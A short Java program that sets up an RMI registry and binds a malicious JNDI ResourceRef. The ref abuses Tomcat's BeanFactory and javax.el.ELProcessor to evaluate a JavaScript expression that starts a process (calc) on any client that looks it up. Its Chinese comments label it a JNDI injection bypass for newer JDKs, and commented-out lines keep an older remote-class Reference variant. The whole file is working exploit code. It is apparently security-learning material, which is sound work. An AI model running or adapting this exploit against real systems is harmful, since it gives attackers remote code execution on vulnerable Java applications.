import org.apache.naming.ResourceRef;

import javax.naming.InitialContext;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class JNDIBypassHighJavaServerEL {
    public static void main(String[] args) throws Exception{
        InitialContext initialContext = new InitialContext();
        Registry registry = LocateRegistry.createRegistry(1099);
        /// RMI原生漏洞
//        initialContext.rebind("rmi://localhost:1099/remoteObj", new RemoteObjImpl());
        /// JNDI注入漏洞
//        Reference reference = new Reference("JNDICalc","JNDICalc","http://localhost:7777/");
//        initialContext.rebind("rmi://localhost:1099/remoteObj", reference);
        /// JNDI高版本JDK绕过
        ResourceRef resourceRef = new ResourceRef(
                "javax.el.ELProcessor",
                null,
                "",
                "",
                true,
                "org.apache.naming.factory.BeanFactory",
                null
        );
        resourceRef.add(new StringRefAddr("forceString","x=eval"));
        resourceRef.add(new StringRefAddr("x","\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" + ".newInstance().getEngineByName(\"JavaScript\")" + ".eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")"));
        initialContext.rebind("rmi://localhost:1099/remoteObj", resourceRef);
    }
}
